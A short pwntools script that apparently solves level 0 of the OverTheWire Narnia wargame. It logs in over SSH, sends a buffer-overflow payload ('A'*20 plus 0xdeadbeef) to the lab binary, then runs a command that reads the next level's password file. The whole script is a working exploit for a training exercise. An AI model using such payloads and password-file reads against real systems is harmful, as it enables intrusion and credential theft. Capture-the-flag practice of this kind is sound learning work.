from pwn import *

context(arch='i386', os='linux')
s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0')
sh = s.run('/narnia/narnia0')
sh.sendline('A'*20 + p32(0xdeadbeef))
sh.sendline('cat /etc/narnia_pass/narnia1')
log.info('Flag: '+sh.recvline().split('\n')[0])
s.close()
